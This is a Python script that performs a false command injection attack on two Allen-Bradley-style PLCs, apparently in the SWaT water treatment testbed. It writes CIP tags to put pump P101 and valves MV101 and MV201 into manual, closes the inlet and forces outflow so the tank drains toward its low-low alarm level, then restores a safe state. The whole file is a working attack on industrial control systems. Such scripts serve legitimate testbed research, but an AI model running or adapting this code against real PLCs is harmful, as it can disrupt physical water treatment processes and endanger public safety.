#!/usr/bin/env python3
"""
phase1_inject.py  —  SWaT Phase 1: False Command Injection
Target: PLC1 (192.168.1.10) + PLC2 (192.168.1.20)

Attack:
  PLC1 — P101 manual ON (pump running)
  PLC1 — MV101 CLOSED  (stop inflow)
  PLC2 — MV201 OPEN    (force outflow to P2)
  → LIT101 drains actively toward LL (250mm)

Usage:
  python3 phase1_inject.py --plc-ip 192.168.1.10 --plc2-ip 192.168.1.20 --duration 120
"""

import argparse, time, signal
from datetime import datetime
from pylogix import PLC

# PLC1 attack commands
PLC1_CMDS = [
    ('HMI_P101.Auto',  False),   # take P101 to manual
    ('HMI_P101.Cmd',   2),       # pump ON
    ('HMI_MV101.Auto', False),   # take MV101 to manual
    ('HMI_MV101.Cmd',  1),       # CLOSE inlet valve
]

# PLC2 attack commands
PLC2_CMDS = [
    ('HMI_MV201.Auto', False),   # take MV201 to manual
    ('HMI_MV201.Cmd',  2),       # OPEN MV201 — force outflow to P2
]

# PLC1 safe state restore
PLC1_SAFE = [
    ('HMI_MV101.Auto', False),
    ('HMI_MV101.Cmd',  2),       # OPEN MV101
    ('HMI_MV101.Auto', True),
    ('HMI_P101.Auto',  False),
    ('HMI_P101.Cmd',   2),       # pump ON
    ('HMI_P101.Auto',  True),
]

# PLC2 safe state restore
PLC2_SAFE = [
    ('HMI_MV201.Auto', False),
    ('HMI_MV201.Cmd',  1),       # CLOSE MV201
    ('HMI_MV201.Auto', True),
]

stop_flag = False


def ts():
    return datetime.now().strftime('%H:%M:%S')


def inject_loop(plc1, plc2, duration, interval=1.0):
    print(f"[ATTACK] Duration={duration}s")
    print(f"[ATTACK] PLC1: P101=ON, MV101=CLOSED")
    print(f"[ATTACK] PLC2: MV201=OPEN")
    print(f"[ATTACK] LIT101 will drain to LL (250mm)\n")

    cycle    = 0
    end_time = time.time() + duration

    while not stop_flag and time.time() < end_time:
        errors = []

        for tag, val in PLC1_CMDS:
            ret = plc1.Write(tag, val)
            if ret.Status != 'Success':
                errors.append(f"PLC1 {tag}: {ret.Status}")

        for tag, val in PLC2_CMDS:
            ret = plc2.Write(tag, val)
            if ret.Status != 'Success':
                errors.append(f"PLC2 {tag}: {ret.Status}")

        # Read current state
        lit  = plc1.Read('HMI_LIT101.Pv').Value
        fit  = plc1.Read('AI_FIT_101_FLOW').Value
        mv1  = plc1.Read('HMI_MV101.Cmd').Value
        p1a  = plc1.Read('HMI_P101.Auto').Value
        mv2  = plc2.Read('HMI_MV201.Cmd').Value

        cycle += 1
        remaining = max(0, int(end_time - time.time()))

        if errors:
            print(f"[{ts()}] cycle={cycle:4d}  ERRORS: {errors}")
        else:
            print(f"[{ts()}] cycle={cycle:4d}  "
                  f"MV101={'CLOSED' if mv1==1 else 'OPEN '}  "
                  f"MV201={'OPEN' if mv2==2 else 'CLOSED'}  "
                  f"P101={'ON(manual)' if not p1a else 'ON(auto)'}  "
                  f"LIT101={lit:.1f}mm  "
                  f"FIT101={fit:.3f}L/s  "
                  f"[{remaining}s left]")

            if lit is not None and lit < 280:
                print(f"  *** WARNING: LIT101={lit:.1f}mm approaching LL (250mm) ***")

        time.sleep(interval)


def restore(plc1, plc2):
    print(f"\n[RESTORE] Restoring safe state...")
    for tag, val in PLC1_SAFE:
        ret = plc1.Write(tag, val)
        print(f"    PLC1  {tag:25s} = {val}  [{ret.Status}]")
    for tag, val in PLC2_SAFE:
        ret = plc2.Write(tag, val)
        print(f"    PLC2  {tag:25s} = {val}  [{ret.Status}]")

    time.sleep(1)
    mv1 = plc1.Read('HMI_MV101.Cmd').Value
    mv2 = plc2.Read('HMI_MV201.Cmd').Value
    p1a = plc1.Read('HMI_P101.Auto').Value
    lit = plc1.Read('HMI_LIT101.Pv').Value
    print(f"\n[RESTORE] MV101={'OPEN' if mv1==2 else 'CLOSED'}  "
          f"MV201={'CLOSED' if mv2==1 else 'OPEN'}  "
          f"P101.Auto={p1a}  LIT101={lit:.1f}mm")
    print("[RESTORE] Done.")


def signal_handler(sig, frame):
    global stop_flag
    print("\n[!] Ctrl+C — stopping attack...")
    stop_flag = True


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--plc-ip',   default='192.168.1.10')
    ap.add_argument('--plc2-ip',  default='192.168.1.20')
    ap.add_argument('--duration', type=int,   default=120)
    ap.add_argument('--interval', type=float, default=1.0)
    args = ap.parse_args()

    signal.signal(signal.SIGINT, signal_handler)

    print("=" * 60)
    print("  SWaT Phase 1 — Direct CIP Tag Injection")
    print(f"  PLC1: {args.plc_ip}   PLC2: {args.plc2_ip}")
    print(f"  Duration: {args.duration}s")
    print(f"  Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)

    with PLC() as plc1, PLC() as plc2:
        plc1.IPAddress = args.plc_ip
        plc2.IPAddress = args.plc2_ip

        # Connectivity checks
        t1 = plc1.Read('HMI_LIT101.Pv')
        if t1.Value is None:
            print(f"[!] Cannot reach PLC1 at {args.plc_ip}: {t1.Status}")
            return
        print(f"[*] PLC1 connected. LIT101={t1.Value:.1f}mm")

        t2 = plc2.Read('HMI_MV201.Cmd')
        if t2.Value is None:
            print(f"[!] Cannot reach PLC2 at {args.plc2_ip}: {t2.Status}")
            return
        print(f"[*] PLC2 connected. MV201.Cmd={t2.Value}\n")

        inject_loop(plc1, plc2, args.duration, args.interval)
        restore(plc1, plc2)

    print("[+] Phase 1 complete.")


if __name__ == '__main__':
    main()
